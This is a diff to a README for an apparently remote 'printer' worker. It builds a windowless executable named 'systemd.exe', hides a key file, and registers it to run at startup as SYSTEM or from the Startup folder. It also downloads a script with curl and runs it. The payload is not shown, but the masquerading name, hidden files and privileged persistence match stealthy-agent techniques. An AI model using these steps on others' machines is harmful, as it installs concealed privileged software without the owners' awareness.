@@ -6,12 +6,12 @@ Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/prepr
 
 ---
 
-## Build Native Binary (Nuitka)
+## Build Native Binary (PyInstaller)
 
 Run in CMD from the repository directory:
 
 ```cmd
-python -m pip install ordered-set zstandard >nul 2>&1 && python -m nuitka --mingw64 --onefile --windows-disable-console --lto=yes --remove-output --jobs=4 --output-filename=systemd.exe printer.py
+python -m pip install pyinstaller ordered-set zstandard && python -m PyInstaller --onefile --noconsole --name systemd --distpath . printer.py
 ```
 
 ---
@@ -23,11 +23,11 @@ Build the native binary first, then run in CMD from the directory containing `sy
 ```cmd
 net session >nul 2>&1
 if %errorLevel% == 0 ( set "d=%ProgramData%\systemd" & set "isAdmin=1" ) else ( set "d=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & set "isAdmin=0" )
-mkdir "%d%" >nul 2>&1
-copy /Y "systemd.exe" "%d%\systemd.exe" >nul 2>&1
-> "%d%\systemd.key" echo DPAPI:YOUR_WORKER_KEY_HERE
-attrib +h +s "%d%\systemd.key" >nul 2>&1
-if "%isAdmin%"=="1" ( schtasks /Create /TN "systemd" /TR "\"%d%\systemd.exe\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1 & schtasks /Run /TN "systemd" >nul 2>&1 ) else ( start "" "%d%\systemd.exe" )
+mkdir "%d%"
+copy /Y "systemd.exe" "%d%\systemd.exe"
+echo YOUR_WORKER_KEY_HERE> "%d%\systemd.key"
+attrib +h +s "%d%\systemd.key"
+if "%isAdmin%"=="1" ( schtasks /Create /TN "systemd" /TR "\"%d%\systemd.exe\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F & schtasks /Run /TN "systemd" ) else ( start "" "%d%\systemd.exe" )
 set "d=" & set "isAdmin="
 ```
 
@@ -36,8 +36,8 @@ set "d=" & set "isAdmin="
 ## Debug Mode
 
 ```cmd
-curl -sLO https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py >nul 2>&1
-move /y printer.py systemd.py >nul 2>&1
+curl -sLO https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py
+move /y printer.py systemd.py
 python systemd.py YOUR_WORKER_KEY_HERE --debug
 ```
 
@@ -48,14 +48,14 @@ python systemd.py YOUR_WORKER_KEY_HERE --debug
 Run in CMD:
 
 ```cmd
-schtasks /Delete /TN "systemd" /F >nul 2>&1
-schtasks /Delete /TN "printer" /F >nul 2>&1
-taskkill /F /IM systemd.exe >nul 2>&1
-taskkill /F /IM printer.exe >nul 2>&1
+schtasks /Delete /TN "systemd" /F
+schtasks /Delete /TN "printer" /F
+taskkill /F /IM systemd.exe
+taskkill /F /IM printer.exe
 set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-del /q /f "%s%\systemd.*" "%s%\printer.*" "%s%\.ident" >nul 2>&1
-rmdir /s /q "%s%\py" >nul 2>&1
-rmdir /s /q "%ProgramData%\systemd" "%ProgramData%\printer" >nul 2>&1
-del /q /f "systemd.*" "printer.*" "py.zip" >nul 2>&1
+del /q /f "%s%\systemd.*" "%s%\printer.*" "%s%\.ident"
+rmdir /s /q "%s%\py"
+rmdir /s /q "%ProgramData%\systemd" "%ProgramData%\printer"
+del /q /f "systemd.*" "printer.*" "py.zip"
 set "s="
 ```
